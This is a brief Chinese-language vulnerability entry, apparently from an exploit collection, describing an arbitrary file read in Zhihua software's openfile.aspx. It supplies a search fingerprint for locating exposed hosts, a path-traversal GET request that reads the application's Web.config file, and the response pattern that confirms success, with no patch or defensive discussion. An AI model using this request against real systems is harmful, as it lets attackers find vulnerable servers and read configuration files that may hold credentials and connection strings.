# 志华软件openfile.aspx存在任意文件读取漏洞

志华软件 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="b28web/Utility/"`
- **请求**：`GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1`
- **响应特征**：302 <?xml version="1.0"?>